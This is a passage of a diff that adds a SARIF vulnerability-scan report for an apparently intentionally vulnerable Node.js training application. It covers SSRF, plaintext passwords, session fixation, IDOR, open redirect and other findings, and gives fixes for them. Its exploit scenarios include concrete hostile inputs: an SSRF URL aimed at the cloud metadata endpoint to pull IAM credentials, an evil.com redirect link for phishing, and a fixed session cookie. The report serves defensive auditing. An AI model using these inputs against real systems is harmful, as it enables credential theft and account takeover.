+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 50
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 88.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_cd167064e850df2b0963805f76dcf0a8"
+          }
+        },
+        {
+          "ruleId": "CWE-256",
+          "level": "error",
+          "message": {
+            "text": "Plaintext Password Storage  [CVSS 7.4: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 220
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "high",
+            "security-severity": "7.4",
+            "cvssRating": "High",
+            "category": "CWE-256",
+            "cvssVector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "cwe": "CWE-256",
+            "cweId": "CWE-256",
+            "cvssScore": 7.4,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "*2 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nIn handleSignup, the raw password from req.body.password is passed directly to userDAO.addUser without any hashing or key derivation. The threat model and comments indicate bcrypt was intentionally omitted, so passwords are stored in plaintext.\n\n#### Impact\nIf the database is ever compromised, all passwords are immediately readable, exposing every user account to takeover.\n\n#### Exploit scenario\nAn attacker who obtains database access (e.g., via NoSQL injection elsewhere) can dump the user collection and read every password, gaining immediate access to all accounts.\n\n#### Preconditions\n- Attacker gains read access to the MongoDB database (e.g., through an injection vulnerability or misconfiguration).\n\n```\nuserDAO.addUser(userName, firstName, lastName, password, email, (err, user) => { ... });\n```\n\n#### How to fix\nHash passwords with bcrypt, argon2, or scrypt before calling addUser. Uncomment the bcrypt code in user-dao.js and adjust this call accordingly.\n\n**Exploitability:** Passwords stored in plaintext; a database breach exposes all user credentials, enabling full account takeover.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 Password from unauthenticated POST /signup \u2192 userDAO.addUser \u2192 MongoDB stored as plaintext (bcrypt fix intentionally commented out)",
+            "dedupRelatedLocationCount": 2
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-256"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 20,
+                  "endLine": 31
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 25
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 74.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_2daf803b5b7555bb0d62f6875d097bfc"
+          }
+        },
+        {
+          "ruleId": "CWE-918: Server-Side Request Forgery (SSRF)",
+          "level": "error",
+          "message": {
+            "text": "Authenticated SSRF via stock research URL  [CVSS 7.7: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/research.js"
+                },
+                "region": {
+                  "startLine": 14
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "high",
+            "security-severity": "7.7",
+            "cvssRating": "High",
+            "category": "CWE-918: Server-Side Request Forgery (SSRF)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+            "cwe": "CWE-918 - Server-Side Request Forgery (SSRF)",
+            "cweId": "CWE-918",
+            "cweName": "Server-Side Request Forgery (SSRF)",
+            "cvssScore": 7.7,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\ndisplayResearch builds the outbound URL by directly concatenating attacker-controlled query parameters req.query.url and req.query.symbol with no allow-list, scheme validation, or private-address blocking. It passes this URL to needle.get, making the server fetch the attacker-chosen target and return the body in the response.\n\n#### Impact\nAny authenticated user can force the server to make GET requests to arbitrary URLs, including localhost, internal services, and cloud metadata endpoints. This can expose internal data or cloud IAM credentials and enable lateral movement inside the network.\n\n#### Exploit scenario\nAuthenticate as any low-privilege user, then request /research?url=http://localhost:4000/&symbol=admin to reach an internal admin page. On AWS, a request such as /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=<role-name> can retrieve temporary IAM credentials. The server concatenates and fetches the URL, and the response body is written back to the client.\n\n#### Preconditions\n- Valid application user account and login session\n- Backend has network reachability to the target host\n\n```\nif (req.query.symbol) {\n    const url = req.query.url + req.query.symbol;\n    return needle.get(url, (error, newResponse, body) => {\n```\n\n#### How to fix\nReplace user-controlled URL fetching with a fixed stock-data client that only calls an allow-listed host. If dynamic fetching remains necessary, validate the scheme, block loopback/RFC1918/link-local addresses, and do not return raw fetched bodies to the browser.\n\n**Exploitability:** Authenticated SSRF via research endpoint. Attacker can reach internal services (e.g., unauthenticated MongoDB) and read responses. Post-auth, low privilege.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 Authenticated SSRF with no allow-list, scheme validation, or private-address blocking; any logged-in user can force the server to fetch arbitrary URLs and receive the response body."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-918"
+            }
+          ],
+          "rank": 77.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_42ecf208cab8a79d3af2dda96cda8704"
+          }
+        },
+        {
+          "ruleId": "CWE-1104: Use of Unmaintained Third Party Components",
+          "level": "error",
+          "message": {
+            "text": "EOL MongoDB 4.4 in docker-compose  [CVSS 8.2: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 14
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "high",
+            "security-severity": "8.2",
+            "cvssRating": "High",
+            "category": "CWE-1104: Use of Unmaintained Third Party Components",
+            "cvssVector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N",
+            "cwe": "CWE-1104 - Use of Unmaintained Third Party Components",
+            "cweId": "CWE-1104",
+            "cweName": "Use of Unmaintained Third Party Components",
+            "cvssScore": 8.2,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe docker-compose.yml defines the mongo service using `image: mongo:4.4`. MongoDB 4.4 is unmaintained, leaving any deployed database vulnerable to all publicly known CVEs for that version. The image is not pinned by digest, adding further supply-chain risk.\n\n#### Impact\nThe MongoDB 4.4 community edition image reached end-of-life in February 2024 and no longer receives critical security patches. An attacker who gains access to the internal Docker network can compromise the database via known, unpatched MongoDB vulnerabilities, leading to data loss or exposure.\n\n#### Exploit scenario\nAfter gaining a foothold inside the web container (e.g., via eval injection in contributions), an attacker uses the local MongoDB client to connect to the mongo service and exploits a known privilege-escalation or authentication-bypass flaw in MongoDB 4.4 to dump all databases.\n\n#### Preconditions\n- An attacker must first gain some degree of access to the internal Docker network (e.g., by compromising the web container or exploiting an SSRF that can speak the MongoDB wire protocol).\n- A known vulnerability in MongoDB 4.4 must be exploitable from the attacker's position.\n\n```\nimage: mongo:4.4\n```\n\n#### How to fix\nUpgrade to a supported MongoDB image (e.g., mongo:7.0 or mongo:8.0) and pin with a digest. Enable authentication by setting MONGO_INITDB_ROOT_USERNAME and MONGO_INITDB_ROOT_PASSWORD environment variables in docker-compose.yml.\n\n**Exploitability:** Docker Compose uses end-of-life MongoDB 4.4; vulnerable to all known unpatched CVEs for that version.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 8/10) \u2014 `docker-compose.yml` line 14 uses `image: mongo:4.4`, an EOL MongoDB version with no authentication configured. The web container (same Docker network) has confirmed exploitable SSJS injection (`eval()` at `app/routes/contributions.js:32-34`), SSRF, and NoSQL injection \u2014 providing a real pivot path to the unmaintained database. No digest pinning, no `MONGO_INITDB_ROOT_*` credentials, and `expose` (not `ports`) offers only Docker-network isolation, which the compromised web container bypasses."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-1104"
+            }
+          ],
+          "rank": 82.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_9c95a4f2ffa0e667b75ed5f896486709"
+          }
+        },
+        {
+          "ruleId": "CWE-494",
+          "level": "error",
+          "message": {
+            "text": "Unpinned GitHub tarball dependency  [CVSS 7.5: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json"
+                },
+                "region": {
+                  "startLine": 39
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "high",
+            "security-severity": "7.5",
+            "cvssRating": "High",
+            "category": "CWE-494",
+            "cvssVector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+            "cwe": "CWE-494",
+            "cweId": "CWE-494",
+            "cvssScore": 7.5,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.9,
+            "description": "*1 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nThe package-lock.json resolves the devDependency `grunt-if` to the mutable URL `https://github.com/binarymist/grunt-if/tarball/master`. When `npm install` is run, npm downloads the current contents of the master branch and executes package installation scripts. There is no integrity hash or fixed version pin to protect against changes to the tarball. An attacker with commit access to that branch (or who can take over the account) can modify the package to include malicious install scripts, which will run on any developer or CI machine that installs the project's dependencies.\n\n#### Impact\nA remote attacker who can alter the GitHub repository branch 'master' for the grunt-if project can execute arbitrary code on any machine that runs `npm install` from this repository. This compromises the developer's workstation and any CI/CD build environment used by the project.\n\n#### Exploit scenario\nAn attacker pushes malicious code to the `binarymist/grunt-if` repository's master branch. When a developer or CI server runs `npm install`, npm fetches the modified tarball, and the attacker's code executes with the privileges of the installing user, allowing exfiltration of credentials, source code, or deployment credentials.\n\n#### Preconditions\n- The repository's master branch is compromised or the attacker has write access to the GitHub repository\n- A developer or CI/CD system runs npm install after the malicious commit\n\n```\n\"grunt-if\": \"https://github.com/binarymist/grunt-if/tarball/master\",\n```\n\n#### How to fix\nReplace the mutable tarball URL with a fixed version and integrity hash, e.g., use a pinned release version or commit hash with package-lock integrity verification, or vendor the required code locally.\n\n**Exploitability:** Grunt-if dependency fetched from an unpinned GitHub tarball. An attacker with commit access to the branch could inject malicious install scripts, leading to developer/CI compromise.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 8/10) \u2014 Mutable tarball URL resolves to master branch; integrity hash protects `npm ci` but `npm install` silently accepts changes; upstream repo compromise leads to code execution on developer machines.",
+            "dedupRelatedLocationCount": 1
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-494"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 51
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 75.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_09bbd503cde8238ecfd4d7b41a635f3a"
+          }
+        },
+        {
+          "ruleId": "CWE-384: Session Fixation",
+          "level": "warning",
+          "message": {
+            "text": "Session fixation due to missing session regeneration on login  [CVSS 6.8: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 116
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "6.8",
+            "cvssRating": "Medium",
+            "category": "CWE-384: Session Fixation",
+            "cvssVector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            "cwe": "CWE-384 - Session Fixation",
+            "cweId": "CWE-384",
+            "cweName": "Session Fixation",
+            "cvssScore": 6.8,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "*1 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nIn handleLoginRequest at line 116, `req.session.userId = user._id` is executed without first calling `req.session.regenerate()`. The comment block (lines 104-118) explicitly acknowledges this vulnerability and provides a fix (regenerate the session). By not regenerating the session, an attacker who learns or sets a session cookie with a known ID before the user logs in can later present that cookie and gain full access as the victim.\n\n#### Impact\nAfter a successful login, the same session ID is used without regeneration. If an attacker can fixate a session identifier before the victim logs in (e.g., by setting a cookie via a phishing link or man-in-the-middle), they can hijack the victim's authenticated session and access the victim's account, including all personal data and admin functions if the victim is an admin.\n\n#### Exploit scenario\n1. Attacker sends victim a link that sets a cookie 'connect.sid=s:fixedvalue' (e.g., via a session fixation vulnerability in a subdomain or an HTTP response splitting attack).\n2. Victim clicks the link, the cookie is set in their browser, then they log in to the application.\n3. The server assigns 'fixedvalue' as the victim's authenticated session ID (since it doesn't regenerate).\n4. Attacker now sends requests with the same cookie 'connect.sid=s:fixedvalue' and is recognized as the logged-in victim, gaining full access to the victim's dashboard, allocations, etc.\n\n#### Preconditions\n- Attacker must be able to set a cookie in the victim's browser for the application domain (e.g., via cookie injection, MITM, or cross-site scripting on a subdomain).\n- Session store trusts the cookie value without regeneration.\n\n```\nreq.session.userId = user._id;\nreturn res.redirect(user.isAdmin ? \"/benefits\" : \"/dashboard\");\n```\n\n#### How to fix\nRegenerate the session immediately after successful authentication, before setting the userId. Replace line 116 with `req.session.regenerate(() => { req.session.userId = user._id; return res.redirect(...); })` as suggested in the comment.\n\n**Exploitability:** Session fixation: missing session regeneration on login. Attacker can pre-set a known session cookie, then victim logs in, attacker hijacks. Requires user interaction.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 `handleLoginRequest` at line 116 assigns `userId` to the session without calling `regenerate()`; the session ID set before login persists post-authentication, enabling session fixation. The explicit commented fix confirms the vulnerability is known.",
+            "dedupRelatedLocationCount": 1
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-384"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 36,
+                  "endLine": 42
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 68.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_bb063d221be77de2d5ca4aefa6e52162"
+          }
+        },
+        {
+          "ruleId": "CWE-614",
+          "level": "warning",
+          "message": {
+            "text": "Session cookie lacks security attributes  [CVSS 6.4: CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 77
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "6.4",
+            "cvssRating": "Medium",
+            "category": "CWE-614",
+            "cvssVector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            "cwe": "CWE-614",
+            "cweId": "CWE-614",
+            "cvssScore": 6.4,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *AV:A (non-network)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe express-session middleware is configured in server.js (lines 77-102) without the 'httpOnly', 'secure', or 'sameSite' cookie flags. The application listens on plain HTTP (line 145), so session cookies are transmitted in cleartext. Without 'httpOnly', client-side scripts can access the cookie if XSS is present. Without 'secure', the cookie is sent even over unencrypted requests.\n\n#### Impact\nAn attacker on the same network can intercept the session cookie via passive eavesdropping or active MITM on HTTP connections. This allows full account takeover for any authenticated victim.\n\n#### Exploit scenario\nAn attacker performs ARP spoofing on a local network to intercept HTTP traffic. A victim logs in to the application, and the session cookie 'connect.sid' is captured in cleartext. The attacker uses this cookie to impersonate the victim and access their profile, allocations, and memos.\n\n#### Preconditions\n- Attacker must be able to intercept network traffic (same LAN, open WiFi, or compromised router)\n- Victim must authenticate over HTTP\n\n```\napp.use(session({\n    secret: [REDACTED-SECRET],\n    saveUninitialized: true,\n    resave: true\n}));\n```\n\n#### How to fix\nIn server.js lines 95-99, uncomment and extend the cookie configuration: set `cookie: { httpOnly: true, secure: true, sameSite: 'strict' }`. Also deploy HTTPS (uncommented lines 152-155) to enforce 'secure' cookies.\n\n**Exploitability:** Session cookie lacks httpOnly, secure, and sameSite flags. Combined with XSS, cookies can be stolen and reused.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 session cookie lacks `secure` and `sameSite` flags; transmitted in cleartext over HTTP. Scanner incorrectly claimed `httpOnly` is missing but the core vulnerability stands."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-614"
+            }
+          ],
+          "rank": 64.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_889dde5438ab686b58fbdf2affcce60f"
+          }
+        },
+        {
+          "ruleId": "CWE-601: URL Redirection to Untrusted Site (Open Redirect)",
+          "level": "warning",
+          "message": {
+            "text": "Open redirect via unvalidated req.query.url  [CVSS 4.6: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 70
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "4.6",
+            "cvssRating": "Medium",
+            "category": "CWE-601: URL Redirection to Untrusted Site (Open Redirect)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
+            "cwe": "CWE-601 - URL Redirection to Untrusted Site (Open Redirect)",
+            "cweId": "CWE-601",
+            "cweName": "URL Redirection to Untrusted Site (Open Redirect)",
+            "cvssScore": 4.6,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.99,
+            "description": "#### Description\nThe /learn route handler extracts req.query.url directly and passes it to res.redirect() without any validation. No scheme, host, or allow-list check is performed, enabling redirection to any URL controlled by an attacker.\n\n#### Impact\nAn attacker can redirect any logged-in user to an arbitrary external site. This can be used in phishing attacks to steal credentials or trick users into downloading malware, leveraging the trust of the legitimate application domain.\n\n#### Exploit scenario\nAn attacker crafts a link such as https://example.com/learn?url=http://evil.com and distributes it to authenticated users. When a logged-in user clicks the link, the browser follows the redirect to the attacker's site, where a forged login page could harvest credentials.\n\n#### Preconditions\n- User must be authenticated (any session), which is easily obtainable in this training application.\n\n```\n    // Handle redirect for learning resources link\n    app.get(\"/learn\", isLoggedIn, (req, res) => {\n        // Insecure way to handle redirects by taking redirect url from query string\n        return res.redirect(req.query.url);\n    });\n```\n\n#### How to fix\nValidate redirect URLs using an allow-list of permitted hosts or enforce that the URL is a relative path. For example, check that url.startsWith('/') or match against a trusted domain before calling res.redirect().\n\n**Exploitability:** Open redirect via unvalidated req.query.url. Can be used in phishing campaigns to redirect users to attacker-controlled pages. Post-auth.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 req.query.url flows unsanitized into res.redirect() with no scheme/host/allow-list check; authenticated route, verified reachable via HTTP."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-601"
+            }
+          ],
+          "rank": 46.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_873a9115b5aeaea6973a73840816b8a0"
+          }
+        },
+        {
+          "ruleId": "CWE-862: Missing Authorization",
+          "level": "warning",
+          "message": {
+            "text": "Missing admin check on benefits routes  [CVSS 5.4: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 55
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.4",
+            "cvssRating": "Medium",
+            "category": "CWE-862: Missing Authorization",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+            "cwe": "CWE-862 - Missing Authorization",
+            "cweId": "CWE-862",
+            "cweName": "Missing Authorization",
+            "cvssScore": 5.4,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.9,
+            "description": "*2 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\napp/routes/index.js:55-56 registers /benefits GET and POST with only the isLoggedIn middleware. The isAdmin middleware is not applied; the immediately following comment shows the intended secure configuration with isAdmin. This makes the updateBenefits handler reachable by any low-privileged authenticated user.\n\n#### Impact\nAny authenticated user can reach the benefits management endpoints intended only for administrators, allowing unauthorized modification of benefits data.\n\n#### Exploit scenario\nA low-privileged user logs in and sends POST /benefits with the same form fields an admin would send. The updateBenefits handler executes without any admin role check, and benefit data is modified without authorization.\n\n#### Preconditions\n- Attacker has a valid authenticated session on the application\n\n```\napp.get(\"/benefits\", isLoggedIn, benefitsHandler.displayBenefits);\napp.post(\"/benefits\", isLoggedIn, benefitsHandler.updateBenefits);\n```\n\n#### How to fix\nApply the isAdmin middleware to both benefit routes in app/routes/index.js:55-56: app.get('/benefits', isLoggedIn, isAdmin, benefitsHandler.displayBenefits); app.post('/benefits', isLoggedIn, isAdmin, benefitsHandler.updateBenefits);\n\n**Exploitability:** Missing admin check on benefits routes; any authenticated user can update benefit start dates. Low impact unless chained with full account control.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 `/benefits` GET/POST routes are guarded only by `isLoggedIn`, not `isAdmin`; any authenticated user can access the admin-only benefits view and modify any non-admin user's benefit start date.",
+            "dedupRelatedLocationCount": 2
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-862"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/benefits.js"
+                },
+                "region": {
+                  "startLine": 13,
+                  "endLine": 27
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/benefits.js"
+                },
+                "region": {
+                  "startLine": 29,
+                  "endLine": 54
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 54.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_c6cc25268c4c440160ae9a439cd93fd4"
+          }
+        },
+        {
+          "ruleId": "CWE-639: Authorization Bypass Through User-Controlled Key",
+          "level": "warning",
+          "message": {
+            "text": "IDOR via userId parameter in allocations route  [CVSS 4.3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 62
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "4.3",
+            "cvssRating": "Medium",
+            "category": "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+            "cwe": "CWE-639 - Authorization Bypass Through User-Controlled Key",
+            "cweId": "CWE-639",
+            "cweName": "Authorization Bypass Through User-Controlled Key",
+            "cvssScore": 4.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.9,
+            "description": "*1 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nThe route /allocations/:userId is protected by isLoggedIn middleware but does not enforce that req.session.userId matches the route parameter req.params.userId. The displayAllocations handler (in allocations.js) uses req.params.userId directly to query the database, allowing horizontal privilege escalation. An attacker authenticated as user A can request /allocations/userB to see user B's financial allocations.\n\n#### Impact\nAny authenticated user can view allocation data (including sensitive financial PII) of other users by changing the :userId URL parameter. No authorization check verifies that the requesting user matches the requested userId.\n\n#### Exploit scenario\nAuthenticated attacker with userId '12345' browses to /allocations/67890 and views another user's bank account numbers, balances, and allocation history without any additional authorization.\n\n#### Preconditions\n- Attacker must be authenticated with any valid user account\n\n```\napp.get(\"/allocations/:userId\", isLoggedIn, allocationsHandler.displayAllocations);\n```\n\n#### How to fix\nIn the displayAllocations handler, verify that req.params.userId matches req.session.userId before querying the database. Reject requests where the IDs do not match, or use the session userId exclusively to fetch data.\n\n**Exploitability:** IDOR in allocations: any authenticated user can read allocations of other users by changing userId URL parameter. Post-auth.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 `displayAllocations` uses `req.params.userId` directly with no ownership check against `req.session.userId`; only `isLoggedIn` middleware guards the route, which does not prevent horizontal access; the commented-out fix confirms the vulnerability is known.",
+            "dedupRelatedLocationCount": 1
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-639"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/allocations.js"
+                },
+                "region": {
+                  "startLine": 16,
+                  "endLine": 19
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 43.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_c82ee1d3484781a6ef1e32d807dbce1f"
+          }
+        },
+        {
+          "ruleId": "CWE-204",
+          "level": "warning",
+          "message": {
+            "text": "Username Enumeration via Login Errors  [CVSS 5.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 63
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.3",
